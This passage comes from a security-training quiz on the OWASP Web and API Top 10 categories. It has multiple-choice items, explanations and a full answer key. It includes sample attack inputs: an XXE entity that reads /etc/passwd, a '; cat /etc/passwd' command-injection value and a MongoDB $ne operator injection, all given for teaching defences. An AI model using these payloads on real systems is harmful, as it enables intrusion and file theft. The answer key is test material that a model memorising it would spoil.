- D) Attacker exploits overly permissive CORS on API responses —
  was called "Security Misconfiguration" in 2019

**Explanation:**
- ✅ **C is correct.** API9:2023 Improper Inventory Management
  targets the reality that organizations frequently lose track of
  their API surface: deprecated v1 endpoints left live after v2
  launches, internal APIs accidentally exposed externally, debug
  endpoints active in production, shadow APIs deployed by teams
  without central security review. The **only name change** from
  2019 is "**Assets** Management" → "**Inventory** Management" —
  position and core concept unchanged.
- ❌ **A** — Rate limiting is API4 (was "Lack of Resources &
  Rate Limiting" in 2019) — not API9.
- ❌ **B** — Mass Assignment was API6:2019 — it was merged into
  BOPLA (API3:2023) — not API9.
- ❌ **D** — CORS misconfiguration is a specific example under
  API8:2023 Security Misconfiguration (was API7:2019).

---

### Q26
**Which of the following correctly distinguishes BOLA from IDOR
in terms of their OWASP placement and context?**

- A) BOLA and IDOR are identical terms used interchangeably across
  all OWASP lists
- B) IDOR is listed in the API Security Top 10; BOLA is listed in
  the Web Application Top 10
- C) BOLA is the newer term that completely replaces IDOR across
  all OWASP contexts
- D) ✅ BOLA (API1:2023) is the API Security Top 10 term for
  object-level authorization failure in APIs; IDOR is the Web
  Application concept now absorbed into A01:2025 Broken Access
  Control

**Explanation:**
- ✅ **D is correct.** The precise distinction:
  - **BOLA** = **B**roken **O**bject **L**evel **A**uthorization —
    lives in the **OWASP API Security Top 10** at **API1** (since
    2019, unchanged in 2023). Specifically addresses authorization
    failures in API object ID manipulation.
  - **IDOR** = **I**nsecure **D**irect **O**bject **R**eference —
    was a standalone category in **OWASP Web App Top 10 2013
    (A4:2013)**. Was removed as standalone in 2017 and its concepts
    are now under **A01:2025 Broken Access Control** in the Web App
    Top 10.
  - They describe the **same attack mechanism** — the difference is
    which list and which context (API vs web app).
- ❌ **A** — They are not fully interchangeable in OWASP context —
  they live on different lists with different scopes.
- ❌ **B** — The placements are reversed from reality. BOLA is on
  the **API Security** list; IDOR was on the **Web Application** list.
- ❌ **C** — BOLA does not replace IDOR across all contexts. IDOR
  concepts still exist under A01:2025 in the Web App Top 10 — just
  not as a standalone named category.

---

### Q27
**Which OWASP API Security 2023 category was at position API7:2019
and moved to position API8:2023?**

- A) Broken Function Level Authorization
- B) Server Side Request Forgery
- C) Improper Inventory Management
- D) ✅ Security Misconfiguration

**Explanation:**
- ✅ **D is correct.** Security Misconfiguration was at
  **API7:2019** and moved to **API8:2023** — a shift of one
  position downward. This is because two new categories were
  inserted in the 2023 list at positions API6 (Unrestricted Access
  to Sensitive Business Flows) and API7 (SSRF) — pushing
  Misconfiguration down from 7 to 8.
- ❌ **A** — Broken Function Level Authorization was **API5:2019**
  and remains at **API5:2023** — no position change.
- ❌ **B** — Server Side Request Forgery (SSRF) is **brand new in
  2023 at API7** — it did not exist in the 2019 list at all.
- ❌ **C** — Improper Inventory Management was **API9:2019** and
  remains at **API9:2023** — no position change, only a rename.

---

### Q28
**DVWA and WebGoat are both intentionally vulnerable applications
used for security training. Which of the following statements
correctly differentiates them?**

- A) DVWA is Java-based; WebGoat is PHP-based with a MySQL backend
- B) DVWA is developed by OWASP; WebGoat is developed by the
  DVWA community
- C) Both DVWA and WebGoat require a commercial license for use
- D) ✅ DVWA is a PHP/MySQL freeform exploitation environment with
  Low/Medium/High/Impossible difficulty levels; WebGoat is an
  OWASP-developed Java (Spring Boot) lesson-based learning platform

**Explanation:**
- ✅ **D is correct.** The key distinctions:
  - **DVWA** — PHP + MySQL, freeform (just exploit the vuln),
    adjustable security levels (Low/Medium/High/Impossible),
    common setup via XAMPP or Docker
  - **WebGoat** — Java (Spring Boot), OWASP project, structured
    lessons with built-in explanations, ships with WebWolf
    (companion app for OOB callbacks), better for guided structured
    learning
- ❌ **A** — The languages are reversed. DVWA is PHP/MySQL;
  WebGoat is Java (Spring Boot).
- ❌ **B** — WebGoat is the OWASP project. DVWA is maintained by
  the DVWA community (originally RandomStorm) — not by OWASP.
- ❌ **C** — Both DVWA and WebGoat are **free, open-source** tools.
  No commercial license is required.

---

### Q29
**An application processes XML input from users and the XML parser
has external entity processing enabled. An attacker submits:**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<user><name>&xxe;</name></user>
```

**Which OWASP 2025 category does this fall under, what vulnerability
is this, and what is the primary defense?**

- A) A05:2025 Injection — SQL injection via XML — use parameterized
  queries
- B) A01:2025 Broken Access Control — unauthorized file access —
  implement RBAC
- C) A07:2025 Authentication Failures — XML bypasses authentication
  — implement MFA
- D) ✅ A02:2025 Security Misconfiguration — XML External Entity
  (XXE) injection — disable external entity processing in the XML
  parser configuration

**Explanation:**
- ✅ **D is correct.** This is an **XXE (XML External Entity)
  injection** attack. The `<!ENTITY xxe SYSTEM "file:///etc/passwd">`
  declaration defines an external entity pointing to a local file.
  When the parser processes `&xxe;`, it resolves the entity and
  substitutes the contents of `/etc/passwd`. XXE is classified
  under **A02:2025 Security Misconfiguration** (where it was merged
  from its standalone A4:2017 position in 2021). The root cause is
  a **parser configuration failure** — external entities are enabled
  when they should be disabled. The primary defense is disabling
  external entity resolution in XML parser configuration (e.g.,
  `FEATURE_EXTERNAL_GENERAL_ENTITIES = false` in Java's SAX parser).
- ❌ **A** — XXE is not SQL injection and is not defended with
  parameterized queries. It's an XML parsing misconfiguration.
  XSS and SQLi are in A05:2025; XXE is under A02:2025.
- ❌ **B** — Broken Access Control (A01) covers authorization
  failures. XXE is a parser misconfiguration that enables file
  read — the root cause is config, not authorization logic.
- ❌ **C** — Authentication Failures (A07) cover identity
  verification. XXE has nothing to do with authentication bypass.

> [!NOTE]
> XXE's placement journey: **A4:2017** (standalone) →
> **merged into A05:2021 Security Misconfiguration** →
> **retained under A02:2025 Security Misconfiguration**.
> Know all three positions.

---

### Q30
**Considering ALL content from Session 01B — which of the following
attack → OWASP 2025 category → defense mappings is INCORRECT?**

- A) MongoDB `{"$ne":""}` operator injection →
  A05:2025 Injection → Use Mongoose ODM with strict schema typing
- B) Attacker uses `; cat /etc/passwd` in a ping parameter →
  A05:2025 Injection → Use subprocess list form, not shell=True
- C) API returns `{"ssn":"123-45-6789"}` in response when only
  `{"name":"Alice"}` was needed →
  API3:2023 BOPLA (Excessive Data Exposure component) →
  Explicit response schemas with allowlisted fields
- D) ✅ Reflected XSS stored in comment field fires for all viewers
  → A05:2025 Injection →
  Use `X-XSS-Protection: 1; mode=block` as primary defense

**Explanation:**
- ✅ **D is the incorrect mapping** — making it the correct answer.
  Two errors exist in option D:
  - **Wrong XSS type:** XSS that is **stored** in a comment field
    and fires for **all viewers** is **Stored XSS** — not Reflected
    XSS. Reflected XSS is in the request/response and affects only
    the user who clicks the crafted link.
  - **Wrong defense:** `X-XSS-Protection: 1; mode=block` is a
    **legacy browser XSS filter** that is **deprecated in modern
    browsers** and has known bypass techniques. The **correct
    primary defense** for XSS is **Output Encoding** +
    **Content Security Policy (CSP)**.
- ❌ **A** — Correct mapping. MongoDB `$ne` = NoSQL Injection =
  A05:2025; Mongoose ODM type enforcement is the correct defense.
- ❌ **B** — Correct mapping. `;` metacharacter = OS Command
  Injection = A05:2025; Python `subprocess.run(['cmd', 'arg'])`
  list form avoids shell interpretation.
- ❌ **C** — Correct mapping. API returning excessive fields =
  Excessive Data Exposure component of BOPLA = API3:2023; explicit
  response schema/serializer allowlist is the correct defense.

---

## Quick Answer Key

| Q | Answer | Category Tested |
|---|---|---|
| Q01 | C | Union-Based SQLi — column count + next step |
| Q02 | D | Time-Based Blind SQLi — SLEEP conditional |
| Q03 | B | Union-Based SQLi — requirements + Oracle FROM DUAL |
| Q04 | D | Second-Order SQLi — stored, fires on retrieval |
| Q05 | D | xp_cmdshell — disabled by default, sysadmin required |
| Q06 | D | LFI — null byte bypass for PHP < 5.3.4 |
| Q07 | D | RFI — allow_url_include Off by default since PHP 5.2 |
| Q08 | D | LFI + Log Poisoning → RCE escalation chain |
| Q09 | D | DOM-Based XSS — server never sees payload |
| Q10 | A | HttpOnly — blocks document.cookie access |
| Q11 | D | XSS — attribute context escape with event handler |
| Q12 | B | NoSQL Injection — MongoDB $ne operator |
| Q13 | C | NoSQL defense — ODM + disable $where |
| Q14 | C | Command Injection — semicolon metacharacter |
| Q15 | A | BOPLA = merge of API3:2019 + API6:2019 |
| Q16 | D | API8:2019 Injection + API10:2019 Logging removed in 2023 |
| Q17 | D | API7:2023 SSRF — webhook to metadata endpoint |
| Q18 | D | API6:2023 — bot abuse of legitimate business flow |
| Q19 | C | BOLA (horizontal/object) vs BFLA (vertical/function) |
| Q20 | D | API10:2023 Unsafe Consumption — third-party API trust |
| Q21 | D | Mass Assignment merged into API3:2023 BOPLA |
| Q22 | C | GraphQL introspection — schema exposure |
| Q23 | C | GraphQL nested query DoS — depth + complexity limits |
| Q24 | D | Heartland breach chronology: SQLi→Malware→RamScrape→Discovery |
| Q25 | C | API9:2023 Improper Inventory — was Improper Assets Management |
| Q26 | D | BOLA (API Security API1) vs IDOR (Web App A01:2025) |
| Q27 | D | Security Misconfiguration: API7:2019 → API8:2023 |
| Q28 | D | DVWA (PHP/freeform) vs WebGoat (Java/OWASP/lessons) |
| Q29 | D | XXE = A02:2025 Security Misconfiguration |
| Q30 | D | Incorrect mapping: Stored XSS misidentified as Reflected; X-XSS-Protection deprecated |

---
